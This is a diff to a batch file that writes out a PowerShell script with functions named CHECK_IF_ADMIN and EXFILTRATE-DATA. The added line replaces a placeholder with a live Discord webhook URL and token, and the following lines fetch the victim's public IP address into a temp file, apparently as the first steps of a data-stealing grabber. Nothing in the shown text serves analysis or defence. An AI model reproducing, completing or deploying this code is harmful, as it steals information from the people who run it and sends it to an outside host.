@@ -8,7 +8,7 @@ echo function CHECK_IF_ADMIN { > powershell123.ps1
 echo $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test >> powershell123.ps1
 echo } >> powershell123.ps1
 echo function EXFILTRATE-DATA { >> powershell123.ps1
-echo $webhook = "YOUR_WEBHOOK_HERE" >> powershell123.ps1
+echo $webhook = "https://discord.com/api/webhooks/1106023974846091284/TysTBqbMVeGF7yR60hxohUocG5BJvh8ZJxvOuKVPsnVXMIZwDpB5wFECrPJdEiAc6F6P" >> powershell123.ps1
 echo $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing >> powershell123.ps1
 echo $ip = $ip.Content >> powershell123.ps1
 echo $ip ^> $env:LOCALAPPDATA\Temp\ip.txt >> powershell123.ps1
